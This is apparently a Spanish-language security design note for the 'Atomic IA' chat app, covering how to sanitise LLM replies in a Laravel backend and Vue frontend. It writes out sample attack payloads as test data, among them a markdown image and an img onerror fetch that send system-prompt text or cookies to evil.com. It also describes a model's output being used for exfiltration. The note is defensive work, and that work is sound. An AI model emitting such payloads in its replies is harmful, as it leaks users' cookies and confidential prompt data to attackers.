# 04 — Validación de Output (Anti-XSS / Anti-Exfiltración)

## Objetivo

Tratar TODA respuesta del LLM como input no confiable. Sanitizar antes de almacenar y antes de renderizar en el frontend, previniendo:

- **XSS**: HTML/JS inyectado en la respuesta que se ejecuta en el navegador
- **Exfiltración por markdown image**: `![](https://attacker.com/steal?data=secret)` — el navegador hace GET al renderizar la imagen, enviando datos al atacante
- **HTML injection**: etiquetas que alteran la UI del chat

---

## Estado actual

### Backend — `MessageResource`

```php
'body' => $this->body,  // Se entrega tal cual, sin sanitizar
```

### Frontend — `AtomicIAChatPage.vue`

```html
<p class="text-sm leading-relaxed whitespace-pre-line">{{ message.body }}</p>
```

Vue usa `{{ }}` (interpolación de texto), que escapa HTML automáticamente. Esto significa que `<script>alert('xss')</script>` se muestra como texto, NO se ejecuta.

**Esto ya es seguro contra XSS básico.** Vue escapa por defecto.

### Pero hay riesgos si en el futuro...

- Se usa `v-html` para renderizar markdown con formato
- Se integra una librería de markdown (marked, markdown-it) sin sanitización
- Se renderiza `media_url` como `<img :src="message.media_url">`

---

## Vectores de ataque

### 1. Markdown image exfiltration

Si el LLM responde:

```
¡Hola! Aquí tienes un consejo: ![tip](https://evil.com/steal?prompt=Eres+Atomic+IA...)
```

Y el frontend renderiza markdown → el navegador hace GET a `evil.com` con datos del system prompt codificados en la URL.

**Hoy no aplica** porque usamos `{{ }}` que muestra el texto plano. Pero es un riesgo latente.

### 2. HTML inyectado

Si el LLM responde con HTML y se usa `v-html`:

```html
<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

**Hoy no aplica** por la misma razón. Pero debe prevenirse a nivel de backend.

### 3. Links maliciosos

El LLM podría responder con URLs que parecen legítimas:

```
Visita este recurso: https://evil.com/fake-atomic-habits
```

Esto no es XSS pero sí ingeniería social. Se mitiga en el frontend.

---

## Implementación

### Capa 1: Backend — Sanitizar en `MessageResource`

Limpiar el body antes de enviarlo al frontend. Esto protege sin importar cómo el frontend renderice en el futuro.

```php
// app/Http/Resources/MessageResource.php

public function toArray(Request $request): array
{
    return [
        'message_id' => $this->message_id,
        'role' => $this->role,
        'type' => $this->type,
        'body' => $this->sanitizeBody($this->body),
        'media_url' => $this->media_url,
        'status' => $this->status,
        'metadata' => $this->metadata,
        'created_at' => $this->created_at->format('H:i'),
    ];
}

private function sanitizeBody(?string $body): ?string
{
    if ($body === null) {
        return null;
    }

    // Stripear tags HTML
    $body = strip_tags($body);

    // Remover markdown images: ![alt](url)
    $body = preg_replace('/!\[.*?\]\(.*?\)/', '', $body);

    // Remover HTML image tags que sobrevivan como texto
    $body = preg_replace('/<img[^>]*>/i', '', $body);

    return trim($body);
}
```

**Qué hace:**
- `strip_tags()` — elimina cualquier HTML/JS. Es la barrera principal
- Regex para `![...](...)` — elimina markdown images (vector de exfiltración)
- Regex para `<img>` — capa extra por si sobrevive alguna tag

**Qué NO hace:**
- No elimina URLs en texto plano (los links como texto son inofensivos sin `v-html`)
- No altera formato de texto normal (negritas con `**` se muestran como texto plano, lo cual ya es el comportamiento actual)

### Capa 2: Frontend — Mantener `{{ }}`, nunca `v-html`

El template actual ya es seguro:

```html
<p class="text-sm leading-relaxed whitespace-pre-line">{{ message.body }}</p>
```

**Regla para el futuro:** si se necesita renderizar markdown, usar una librería con sanitización integrada (ej: `marked` + `DOMPurify`), NUNCA `v-html` directo.

---

## Archivos a modificar

| Archivo | Cambio |
|---------|--------|
| `app/Http/Resources/MessageResource.php` | Agregar `sanitizeBody()` y usarlo en `body` |

---

## Notas

- La sanitización se aplica en el Resource, no en la BD. El body original se guarda intacto para auditoría y debugging
- `strip_tags()` es agresivo — elimina TODO HTML. Si en el futuro se quiere permitir formato (negritas, listas), habría que reemplazarlo por una whitelist de tags con HTMLPurifier
- El campo `media_url` debería validarse contra un dominio propio si se implementan adjuntos en el futuro

---

## Pruebas de validación

| Input del LLM | Resultado esperado |
|---------------|-------------------|
| `<script>alert('xss')</script>Hola` | `Hola` (tag eliminada) |
| `Consejo: ![tip](https://evil.com/steal?data=secret)` | `Consejo:` (imagen eliminada) |
| `<img src="x" onerror="fetch(...)">Hola` | `Hola` (tag eliminada) |
| `Hola, ¿cómo estás? **Bienvenido**` | `Hola, ¿cómo estás? **Bienvenido**` (sin cambios, texto plano seguro) |
| `Visita https://atomichabits.com` | `Visita https://atomichabits.com` (sin cambios, URL en texto plano es inofensiva) |